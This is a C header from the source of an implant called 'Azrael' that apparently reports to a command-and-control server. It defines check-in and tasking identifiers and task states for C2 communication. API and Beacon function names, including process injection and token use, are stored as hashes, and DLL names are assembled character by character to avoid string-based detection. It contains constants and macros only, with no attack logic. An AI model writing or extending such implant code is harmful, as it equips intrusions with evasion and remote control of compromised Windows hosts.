#ifndef AZRAEL_IMPLANT_UTILS_H
#define AZRAEL_IMPLANT_UTILS_H
#include <stdio.h>
#include "winapi.h"

#define DEBUG_LEVEL 2
#if DEBUG_LEVEL == 1
    #define DEBUG(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_MEDIUM(x, ...)
    #define DEBUG_LOW(x, ...)
    #define DEBUG_NATIVE(x, ...)
#elif DEBUG_LEVEL == 2
    #define DEBUG(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_MEDIUM(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_LOW(x, ...)
    #define DEBUG_NATIVE(x, ...)
#elif DEBUG_LEVEL == 3
    #define DEBUG(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_MEDIUM(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_LOW(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_NATIVE(x, ...)
#elif DEBUG_LEVEL == 4
    #define DEBUG(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_MEDIUM(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_LOW(x, ...) printf(x, ##__VA_ARGS__)
    #define DEBUG_NATIVE(x, ...) printf(x, ##__VA_ARGS__)
#else
    #define DEBUG(x, ...)
    #define DEBUG_MEDIUM(x, ...)
    #define DEBUG_LOW(x, ...)
    #define DEBUG_NATIVE(x, ...)
#endif

#if MSVC
    #define GetStackFrameSize() ((DWORD64)_AddressOfReturnAddress() - getRsp())
#else
    #define GetStackFrameSize() ((DWORD64)__builtin_frame_address(0) - getRsp() + 8)
#endif


#define CHECKIN_UUID (char[]){'0','0','0','0','0','0','0','0','-','0','0','0','0','-','0','0','0','0','-','0','0','0','0','-','0','0','0','0','0','0','0','0','0','0','0','0','\0'}
#define TASKING_UUID (char[]){'0','0','0','0','0','0','0','0','-','0','0','0','0','-','0','0','0','0','-','0','0','0','0','-','0','0','0','0','0','0','0','0','0','0','0','1','\0'}
#define STR_STATUS 0x7fc31f4d
#define STR_FINISHED 0x4c7a7f13
#define STR_INTERNAL_IP 0x66d927fe
#define STR_EXTERNAL_IP 0x79cffe44
#define STR_USER 0x517563c8
#define STR_COMPUTER 0x53bd3bb8
#define STR_PROCESS 0x8d81c248
#define STR_PID 0x11fbb626
#define STR_PARAMS 0x7774d46d
#define STR_ACTION 0x549cdf07
#define STR_GET_TASK 0x1460e03b
#define STR_TASK 0x51748c9c
#define STR_NAME 0x5171418a
#define STR_UUID 0x51756cc0
#define STR_DATA 0x516bc6a3
#define STR_CHECKIN 0x8cc4395e
#define STR_LISTENER 0xe26ec14f
#define STR_CONTENT 0x9dc46be4
#define STR_DELEGATED 0x9da45368
#define STR_RESPONSE 0x37cde718
#define STR_TASK_UUID 0x5ef7f572
#define STR_FILENAME 0x4784f12a
#define STR_SLEEP 0x7ff9d3c2

#define STATUS_SUCCESS 0x7a96cc62
#define STATUS_FAILED 0x601c7c6e
#define STATUS_ERROR 0x7effff93
#define STATUS_BAD_ARGUMENT 0xa11daf33
#define STATUS_ERROR_OPEN 0xe32d7305
#define STATUS_ERROR_SEEK 0xe32f75bb
#define STATUS_ERROR_ALLOC 0x47dc693e
#define STATUS_ERROR_FREAD 0x483a0e75


// Status when the task object is created
#define TASK_INITIALIZED 0
// Status when the task function has been run
#define TASK_PROCESSED 1
// Status when the task result has been sent to the C2
#define TASK_RESPONSE_SENT 2
// Status when the task has been processed and sent but the C2
// didn't acknowledge the response
#define TASK_WAITING_RESPONSE 3
// Status when the task has been fully completed
#define TASK_FINISHED 4


#define WSTR_HEADER 0x650aaab2
#define WSTR_URL_PARAM 0x968897cc
#define WSTR_BODY 0x516ae777
#define WSTR_POST 0x517296af

#define WSTR_CONTENT_TYPE_POST (wchar_t[]){L'C',L'o',L'n',L't',L'e',L'n',L't',L'-',L'T',L'y',L'p',L'e',L':',L' ',L'a',L'p',L'p',L'l',L'i',L'c',L'a',L't',L'i',L'o',L'n',L'/',L'x',L'-',L'w',L'w',L'w',L'-',L'f',L'o',L'r',L'm',L'-',L'u',L'r',L'l',L'e',L'n',L'c',L'o',L'd',L'e',L'd','\0'}
#define WSTR_MSVCRT (wchar_t[]){L'm', L's', L'v', L'c', L'r', L't', L'.', L'd', L'l', L'l', L'\0'}
#define WSTR_WINHTTP (wchar_t[]){L'w',L'i',L'n',L'h',L't',L't',L'p',L'.',L'd',L'l',L'l',L'\0'}
#define WSTR_WS2_32 (wchar_t[]){L'w',L's',L'2',L'_',L'3',L'2',L'.',L'd',L'l',L'l',L'\0'}
#define WSTR_WSOCK32 (wchar_t[]){L'w',L's',L'o',L'c',L'k',L'3',L'2',L'.',L'd',L'l',L'l',L'\0'}
#define WSTR_ADVAPI32 (wchar_t[]){L'A', L'd', L'v', L'a', L'p', L'i', L'3', L'2', L'.', L'd', L'l', L'l', L'\0'}

#define STR_BEACONDATAPARSE 0x7224b966
#define STR_BEACONDATAINT 0x1eaa1ed6
#define STR_BEACONDATASHORT 0x725eccbb
#define STR_BEACONDATALENGTH 0xadad434d
#define STR_BEACONDATAEXTRACT 0x754251a6
#define STR_BEACONFORMATALLOC 0xa4144365
#define STR_BEACONFORMATRESET 0xa54429dd
#define STR_BEACONFORMATFREE 0xbf2a3d5c
#define STR_BEACONFORMATAPPEND 0x26e71ab2
#define STR_BEACONFORMATPRINTF 0x4a04fd8d
#define STR_BEACONFORMATTOSTRING 0xc11259b4
#define STR_BEACONFORMATINT 0xc7bb8285
#define STR_BEACONPRINTF 0x63eb0ee4
#define STR_BEACONOUTPUT 0x61d240a2
#define STR_BEACONUSETOKEN 0xec430e1f
#define STR_BEACONREVERTTOKEN 0x49ddae2a
#define STR_BEACONISADMIN 0xc8340dd6
#define STR_BEACONGETSPAWNTO 0xfe684dfd
#define STR_BEACONSPAWNTEMPORARYPROCESS 0xbe40b29c
#define STR_BEACONINJECTPROCESS 0xe5f36a4d
#define STR_BEACONINJECTTEMPORARYPROCESS 0xb77acc50
#define STR_BEACONCLEANUPPROCESS 0xa6c11f18
#define STR_TOWIDECHAR 0x73b0f793
#define STR_LOADLIBRARYA 0x9133019f
#define STR_GETPROCADDRESS 0xf3371483
#define STR_GETMODULEHANDLEA 0xa48ff59c
#define STR_FREELIBRARY 0x3a305a60

#endif //AZRAEL_IMPLANT_UTILS_H
